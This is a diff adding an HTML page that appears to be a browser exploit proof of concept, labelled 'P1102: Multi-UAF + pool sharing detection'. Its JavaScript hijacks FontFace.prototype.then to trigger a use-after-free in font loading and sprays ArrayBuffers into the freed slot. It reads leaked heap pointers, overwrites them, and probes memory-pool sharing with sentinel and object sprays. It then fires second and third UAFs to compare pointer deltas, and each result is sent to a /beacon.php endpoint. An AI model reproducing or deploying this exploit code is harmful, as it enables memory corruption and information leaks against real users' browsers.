@@ -1,0 +1,415 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1102</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.crit{color:#f00;font-weight:bold;font-size:14px}
+.win{color:#0f0;font-weight:bold;font-size:15px}
+.phase{color:#fff;font-size:14px;font-weight:bold;margin:8px 0}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2 style="color:#fff;font-size:16px;margin-bottom:4px">P1102: Multi-UAF + pool sharing detection</h2>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+B('P1102-BOOT','');
+
+// ============================================================
+// PART 1: Primary UAF (proven technique)
+// ============================================================
+var styleEl=null,firedHere=false,map=null,hitEntry=null,hitIdx=-1;
+var b64ref=null,leakedPtrs=null,patched=false,patchTime=0;
+
+var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A);
+void A.loaded;
+styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+
+firedHere=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedHere)return undefined;
+    firedHere=true;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){
+        map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll
+for(var t=15;t<=200;t+=5){
+  (function(ms){
+    setTimeout(function(){
+      if(patched||!map)return;
+      if(typeof BigUint64Array==='undefined')return;
+      for(var bi=32;bi<40;bi++){
+        if(!map[bi])continue;
+        var b64=new BigUint64Array(map[bi].ab);
+        var nz=0;
+        for(var qi=0;qi<b64.length;qi++)if(b64[qi]!==0n)nz++;
+        if(nz>0&&!patched){
+          patched=true;patchTime=ms;hitEntry=map[bi];hitIdx=bi;
+          b64ref=b64;
+          leakedPtrs=[];
+          for(var qi=0;qi<b64.length;qi++)
+            if(b64[qi]!==0n)leakedPtrs.push({off:qi*8,val:b64[qi]});
+          b64[0]=0x100n;
+          var pstr=leakedPtrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(',');
+          log('crit','UAF1 PATCHED buf#'+bi+' at '+ms+'ms');
+          log('ptr',pstr);
+          B('P1102-UAF1','buf='+bi+'|ms='+ms+'|'+pstr);
+          bar.style.width='15%';
+        }
+      }
+    },ms);
+  })(t);
+}
+
+// ============================================================
+// PART 2: Pool sharing test — what 192-byte objects exist?
+// After UAF established, free our UAF buffer via structuredClone
+// transfer, then see what engine objects reclaim the slot
+// ============================================================
+setTimeout(function(){
+  if(!patched){B('P1102-NOHIT','');return;}
+
+  log('','');
+  log('phase','Part 2: Pool sharing — structuredClone transfer test');
+
+  // Save pointer data before we lose access
+  var saved58=b64ref[0x58/8];
+  var saved68=b64ref[0x68/8];
+  log('info','Saved pointers: +0x58='+hex(saved58)+', +0x68='+hex(saved68));
+
+  // Make a SECOND set of 192-byte buffers as sentinels
+  // These will tell us about adjacent allocations
+  var sentinel=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(192);
+    var b=new BigUint64Array(ab);
+    // Write unique marker: 0xAAAA0000 + index
+    b[0]=BigInt(0xAAAA0000+i);
+    sentinel.push({ab:ab,b64:b,idx:i});
+  }
+  log('info','Created 50 sentinel buffers (192B each)');
+
+  // Now detach the UAF buffer via structuredClone transfer
+  var uafAb=hitEntry.ab;
+  log('info','Transferring UAF buffer via structuredClone...');
+  var cloned=null;
+  try{
+    cloned=structuredClone(uafAb,{transfer:[uafAb]});
+    log('ok','Transfer succeeded! UAF buffer detached.');
+    log('info','Cloned buffer size: '+cloned.byteLength);
+
+    // Read the cloned data (has our patched values)
+    var cloneB64=new BigUint64Array(cloned);
+    var cloneVals=[];
+    for(var qi=0;qi<cloneB64.length;qi++)
+      if(cloneB64[qi]!==0n)cloneVals.push('+'+hex(qi*8)+'='+hex(cloneB64[qi]));
+    log('ptr','Clone contents: '+cloneVals.join(', '));
+    B('P1102-CLONE',cloneVals.join(',').substring(0,400));
+
+  }catch(e){
+    log('fail','Transfer failed: '+e.message);
+    B('P1102-XFER-FAIL',e.message.substring(0,200));
+  }
+
+  bar.style.width='30%';
+
+  // The freed 192-byte slot is now back in bmalloc's free list
+  // Allocate various objects that MIGHT be 192 bytes internally
+
+  setTimeout(function(){
+    log('','');
+    log('phase','Part 3: Object spray into freed slot');
+
+    // Strategy: allocate objects that might use the 192-byte pool,
+    // then check sentinels for changes (if an object overlaps a sentinel)
+
+    // Spray various object types
+    var sprayResults=[];
+
+    // A) Medium strings (~170 chars = 170 + header ≈ 192)
+    var strings=[];
+    for(var i=0;i<100;i++){
+      var s='';
+      for(var j=0;j<170;j++)s+=String.fromCharCode(65+(j%26));
+      strings.push(s);
+    }
+    sprayResults.push('strings:100x170char');
+
+    // B) Small ArrayBuffers (exact 192 bytes)
+    var abs2=[];
+    for(var i=0;i<50;i++){
+      var ab2=new ArrayBuffer(192);
+      var v2=new BigUint64Array(ab2);
+      v2[0]=BigInt(0xBBBB0000+i);
+      abs2.push({ab:ab2,b64:v2});
+    }
+    sprayResults.push('abs:50x192B');
+
+    // C) DOM nodes
+    var nodes=[];
+    for(var i=0;i<50;i++){
+      var div=document.createElement('div');
+      div.setAttribute('data-x','A'.repeat(120));
+      nodes.push(div);
+    }
+    sprayResults.push('divs:50');
+
+    // D) CSS font-face rules (re-allocate CSSFontFace objects)
+    var seArr=[];
+    for(var i=0;i<20;i++){
+      var se=document.createElement('style');
+      se.textContent="@font-face{font-family:pool"+i+";src:local(serif);unicode-range:U+00"+(41+i).toString(16).toUpperCase()+";}";
+      document.head.appendChild(se);
+      seArr.push(se);
+    }
+    sprayResults.push('fontfaces:20');
+
+    // E) RegExp objects
+    var regexps=[];
+    for(var i=0;i<50;i++){
+      regexps.push(new RegExp('[A-Z'+i+']{10,50}','g'));
+    }
+    sprayResults.push('regexp:50');
+
+    log('info','Sprayed: '+sprayResults.join(', '));
+    B('P1102-SPRAY',sprayResults.join(','));
+
+    // Now check: did any sentinel buffer get overwritten?
+    setTimeout(function(){
+      log('','');
+      log('phase','Part 4: Sentinel scan — check for cross-type overlap');
+
+      var overlaps=[];
+      for(var i=0;i<sentinel.length;i++){
+        var b=sentinel[i].b64;
+        var marker=BigInt(0xAAAA0000+i);
+        if(b[0]!==marker){
+          // Something overwrote our sentinel!
+          var vals=[];
+          for(var qi=0;qi<b.length;qi++)
+            if(b[qi]!==0n&&b[qi]!==marker)vals.push('+'+hex(qi*8)+'='+hex(b[qi]));
+          overlaps.push({idx:i,oldMarker:hex(marker),newVal:hex(b[0]),changes:vals});
+          log('crit','OVERLAP at sentinel #'+i+'! marker '+hex(marker)+' -> '+hex(b[0]));
+          log('ptr','  Changes: '+vals.join(', '));
+        }
+      }
+
+      // Also check the new 192-byte abs2 spray
+      var abs2Overlaps=[];
+      for(var i=0;i<abs2.length;i++){
+        var b=abs2[i].b64;
+        var marker=BigInt(0xBBBB0000+i);
+        if(b[0]!==marker){
+          var vals=[];
+          for(var qi=0;qi<b.length;qi++)
+            if(b[qi]!==0n&&b[qi]!==marker)vals.push('+'+hex(qi*8)+'='+hex(b[qi]));
+          abs2Overlaps.push({idx:i,new0:hex(b[0]),changes:vals});
+          log('hit','abs2 #'+i+' marker changed: '+hex(marker)+' -> '+hex(b[0]));
+        }
+      }
+
+      B('P1102-OVERLAPS','sent='+overlaps.length+'|abs2='+abs2Overlaps.length);
+
+      if(overlaps.length>0){
+        log('win','CROSS-TYPE OVERLAP DETECTED! '+overlaps.length+' sentinel(s) overwritten');
+        var oData=overlaps.map(function(o){return'#'+o.idx+':'+o.newVal;}).join(',');
+        B('P1102-OVERLAP-DATA',oData.substring(0,600));
+      }else{
+        log('info','No sentinel overlaps — bmalloc pool isolation holds');
+      }
+
+      bar.style.width='50%';
+
+      // ============================================================
+      // PART 5: Second UAF via data: URL font (async loading)
+      // ============================================================
+      setTimeout(function(){
+        log('','');
+        log('phase','Part 5: Second UAF trigger (data: URL font)');
+
+        // Minimal valid WOFF2 would be complex, so try a URL that 404s
+        // The font loading should still trigger the thenable check
+        var se2=document.createElement('style');
+        se2.textContent="@font-face{font-family:s1;src:url('/nonexistent-"+Date.now()+".woff2');unicode-range:U+0043;}";
+        document.head.appendChild(se2);
+
+        var B2=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0043'});
+        document.fonts.add(B2);
+        void B2.loaded;
+
+        var map2=null,fired2=false,patched2=false,hit2=null;
+        Object.defineProperty(FontFace.prototype,'then',{
+          configurable:true,
+          get:function(){
+            if(fired2)return undefined;
+            fired2=true;
+            se2.remove();
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            map2=[];
+            for(var si=0;si<SIZES.length;si++){
+              var sz=SIZES[si];
+              for(var k=0;k<K;k++){
+                map2.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
+              }
+            }
+            try{document.fonts.check('1em s1');}catch(e){}
+            return undefined;
+          },
+          set:function(){}
+        });
+        document.fonts.load('1em f1, s1','CD').then(function(){},function(){});
+
+        // Poll second trigger
+        for(var t2=15;t2<=300;t2+=5){
+          (function(ms){
+            setTimeout(function(){
+              if(patched2||!map2)return;
+              for(var bi=32;bi<40;bi++){
+                if(!map2[bi])continue;
+                var b2=new BigUint64Array(map2[bi].ab);
+                var nz=0;
+                for(var qi=0;qi<b2.length;qi++)if(b2[qi]!==0n)nz++;
+                if(nz>0&&!patched2){
+                  patched2=true;hit2=bi;
+                  b2[0]=0x100n;
+                  var ptrs2=[];
+                  for(var qi=0;qi<b2.length;qi++)
+                    if(b2[qi]!==0n)ptrs2.push({off:qi*8,val:b2[qi]});
+                  var p2s=ptrs2.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(',');
+                  log('win','UAF2 PATCHED buf#'+bi+' at '+ms+'ms!');
+                  log('ptr',p2s);
+                  B('P1102-UAF2','buf='+bi+'|ms='+ms+'|'+p2s);
+
+                  // Compare UAF1 and UAF2 pointers
+                  var p2_58=ptrs2.find(function(p){return p.off===0x58;});
+                  var p2_68=ptrs2.find(function(p){return p.off===0x68;});
+                  if(p2_58)log('ptr','UAF2 +0x58='+hex(p2_58.val)+' delta from UAF1: '+(p2_58.val-saved58).toString());
+                  if(p2_68)log('ptr','UAF2 +0x68='+hex(p2_68.val)+' delta from UAF1: '+(p2_68.val-saved68).toString());
+                  B('P1102-DELTA','d58='+(p2_58?(p2_58.val-saved58).toString():'?')+'|d68='+(p2_68?(p2_68.val-saved68).toString():'?'));
+                }
+              }
+            },ms);
+          })(t2);
+        }
+
+        // Also try: third trigger with entirely different mechanism
+        // Use FontFace constructor + load() directly
+        setTimeout(function(){
+          log('','');
+          log('phase','Part 6: Third UAF via FontFace.load()');
+
+          var ff3=new FontFace('f2','local(Courier)',{unicodeRange:'U+0044'});
+          document.fonts.add(ff3);
+
+          var se3=document.createElement('style');
+          se3.textContent="@font-face{font-family:s2;src:local(Times);unicode-range:U+0045;}";
+          document.head.appendChild(se3);
+
+          var map3=null,fired3=false,patched3=false;
+          Object.defineProperty(FontFace.prototype,'then',{
+            configurable:true,
+            get:function(){
+              if(fired3)return undefined;
+              fired3=true;
+              se3.remove();
+              try{document.fonts.delete(this);}catch(e){}
+              document.body.offsetHeight;
+              map3=[];
+              for(var si=0;si<SIZES.length;si++){
+                var sz=SIZES[si];
+                for(var k=0;k<K;k++){
+                  map3.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
+                }
+              }
+              try{document.fonts.check('1em s2');}catch(e){}
+              return undefined;
+            },
+            set:function(){}
+          });
+
+          // Use ff3.load() instead of document.fonts.load()
+          ff3.load().then(function(){},function(){});
+          // Also try document.fonts.load as backup
+          document.fonts.load('1em f2, s2','DE').then(function(){},function(){});
+
+          for(var t3=15;t3<=300;t3+=5){
+            (function(ms){
+              setTimeout(function(){
+                if(patched3||!map3)return;
+                for(var bi=32;bi<40;bi++){
+                  if(!map3[bi])continue;
+                  var b3=new BigUint64Array(map3[bi].ab);
+                  var nz=0;
+                  for(var qi=0;qi<b3.length;qi++)if(b3[qi]!==0n)nz++;
+                  if(nz>0&&!patched3){
+                    patched3=true;
+                    b3[0]=0x100n;
+                    var ptrs3=[];
+                    for(var qi=0;qi<b3.length;qi++)
+                      if(b3[qi]!==0n)ptrs3.push({off:qi*8,val:b3[qi]});
+                    var p3s=ptrs3.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(',');
+                    log('win','UAF3 PATCHED buf#'+bi+' at '+ms+'ms!');
+                    log('ptr',p3s);
+                    B('P1102-UAF3','buf='+bi+'|ms='+ms+'|'+p3s);
+                  }
+                }
+              },ms);
+            })(t3);
+          }
+
+          // Final summary
+          setTimeout(function(){
+            bar.style.width='100%';
+            log('','');
+            log('phase','=== P1102 Summary ===');
+            log('win','UAF1: buf#'+hitIdx+' at '+patchTime+'ms — '+hex(saved58)+'/'+hex(saved68));
+            if(patched2)log('win','UAF2: buf#'+hit2+' — MULTI-UAF WORKS!');
+            else log('fail','UAF2: did not fire');
+            if(patched3)log('win','UAF3: WORKS');
+            else log('fail','UAF3: did not fire');
+            log('info','Sentinel overlaps: check beacon data');
+            log('info','structuredClone transfer: '+(cloned?'OK ('+cloned.byteLength+'B)':'FAILED'));
+            B('P1102-DONE','uaf1='+patched+'|uaf2='+patched2+'|uaf3='+patched3+'|overlaps='+overlaps.length+'|xfer='+(cloned?'ok':'fail'));
+          },2000);
+        },1500);
+
+      },500);
+    },300);
+  },200);
+},800);
+</script>
+</body></html>
